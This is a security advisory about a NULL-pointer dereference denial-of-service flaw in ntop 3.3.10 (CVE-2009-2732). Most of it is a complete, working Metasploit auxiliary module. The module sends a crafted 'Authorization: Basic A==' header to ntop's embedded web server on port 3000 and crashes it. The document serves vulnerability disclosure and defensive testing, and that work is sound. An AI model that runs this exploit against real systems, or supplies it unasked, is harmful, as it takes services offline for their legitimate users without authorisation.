source: http://www.securityfocus.com/bid/36074/info

The 'ntop' tool is prone to a denial-of-service vulnerability because of a NULL-pointer dereference that occurs when crafted HTTP Basic Authentication credentials are received by the embedded webserver.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users.

This issue affects ntop 3.3.10; other versions may also be affected. 

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

        include Msf::Exploit::Remote::HttpClient
        include Msf::Auxiliary::Dos

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'NTOP <= 3.3.10 Basic Authorization DoS',
                        'Description'    => %q{
                                A denial of service condition can be reached by specifying an invalid value for the Authorization
                                HTTP header. When ntop recieves this, it attempts to base64 decode the value then split it based on
                                a colon. When no colon exists in the decoded string the username is left at its default NULL value.
                                During the authentication process the length of the username is computed via strlen(), which results
                                in a segmentation fault when it processes the null value.
                        },
                        'Author'         => 'Brad Antoniewicz <brad.antoniewicz@foundstone.com>',
                        'License'        => MSF_LICENSE,
                        'Version'        => '1',
                        'References'     => [
                                [ 'BID', 'None'],
                                [ 'CVE', 'CVE-2009-2732']

                        ],
                        'DisclosureDate' => 'Aug 08 2009'))
                        register_options( [Opt::RPORT(3000),], self.class )

        end

        def run
                begin
                        o = {
                                'uri' => '/configNtop.html',
                                'headers' => {
                                        'Authorization' => 'Basic A=='
                                }
                        }

                        c = connect(o)
                        c.send_request(c.request_raw(o))

                        print_status("Request sent to #{rhost}:#{rport}")
                rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
                        print_status("Couldn't connect to #{rhost}:#{rport}")
                rescue ::Timeout::Error, ::Errno::EPIPE
                end
        end
end